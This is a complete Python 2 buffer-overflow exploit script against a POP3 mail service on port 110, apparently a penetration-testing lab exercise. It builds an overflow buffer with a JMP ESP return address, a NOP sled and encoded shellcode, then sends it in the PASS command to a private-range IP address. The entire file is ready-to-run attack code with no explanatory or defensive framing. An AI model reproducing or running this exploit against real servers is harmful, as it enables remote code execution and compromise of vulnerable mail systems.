#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# 5F4A358F   FFE4             JMP ESP

shellcode = ("\xdb\xc5\xb8\x24\x01\xd7\xbd\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"
"\x52\x31\x43\x17\x03\x43\x17\x83\xcf\xfd\x35\x48\xf3\x16\x3b"
"\xb3\x0b\xe7\x5c\x3d\xee\xd6\x5c\x59\x7b\x48\x6d\x29\x29\x65"
"\x06\x7f\xd9\xfe\x6a\xa8\xee\xb7\xc1\x8e\xc1\x48\x79\xf2\x40"
"\xcb\x80\x27\xa2\xf2\x4a\x3a\xa3\x33\xb6\xb7\xf1\xec\xbc\x6a"
"\xe5\x99\x89\xb6\x8e\xd2\x1c\xbf\x73\xa2\x1f\xee\x22\xb8\x79"
"\x30\xc5\x6d\xf2\x79\xdd\x72\x3f\x33\x56\x40\xcb\xc2\xbe\x98"
"\x34\x68\xff\x14\xc7\x70\x38\x92\x38\x07\x30\xe0\xc5\x10\x87"
"\x9a\x11\x94\x13\x3c\xd1\x0e\xff\xbc\x36\xc8\x74\xb2\xf3\x9e"
"\xd2\xd7\x02\x72\x69\xe3\x8f\x75\xbd\x65\xcb\x51\x19\x2d\x8f"
"\xf8\x38\x8b\x7e\x04\x5a\x74\xde\xa0\x11\x99\x0b\xd9\x78\xf6"
"\xf8\xd0\x82\x06\x97\x63\xf1\x34\x38\xd8\x9d\x74\xb1\xc6\x5a"
"\x7a\xe8\xbf\xf4\x85\x13\xc0\xdd\x41\x47\x90\x75\x63\xe8\x7b"
"\x85\x8c\x3d\x2b\xd5\x22\xee\x8c\x85\x82\x5e\x65\xcf\x0c\x80"
"\x95\xf0\xc6\xa9\x3c\x0b\x81\xdf\xcb\x13\xa2\x88\xc9\x13\x45"
"\xf2\x47\xf5\x2f\x14\x0e\xae\xc7\x8d\x0b\x24\x79\x51\x86\x41"
"\xb9\xd9\x25\xb6\x74\x2a\x43\xa4\xe1\xda\x1e\x96\xa4\xe5\xb4"
"\xbe\x2b\x77\x53\x3e\x25\x64\xcc\x69\x62\x5a\x05\xff\x9e\xc5"
"\xbf\x1d\x63\x93\xf8\xa5\xb8\x60\x06\x24\x4c\xdc\x2c\x36\x88"
"\xdd\x68\x62\x44\x88\x26\xdc\x22\x62\x89\xb6\xfc\xd9\x43\x5e"
"\x78\x12\x54\x18\x85\x7f\x22\xc4\x34\xd6\x73\xfb\xf9\xbe\x73"
"\x84\xe7\x5e\x7b\x5f\xac\x7f\x9e\x75\xd9\x17\x07\x1c\x60\x7a"
"\xb8\xcb\xa7\x83\x3b\xf9\x57\x70\x23\x88\x52\x3c\xe3\x61\x2f"
"\x2d\x86\x85\x9c\x4e\x83")

buffer = "A"*2606 + "\x8f\x35\x4a\x5f" + "\x90" * 16 + shellcode + "C"*(3500-2606-4-16-351)
try:
	print "\nSending evil buffer..."
	s.connect(('10.11.21.75',110))
	data = s.recv(1024)
	s.send('USER username' +'\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	print "\nDone!."
except:
	print "Could not connect to POP3!"
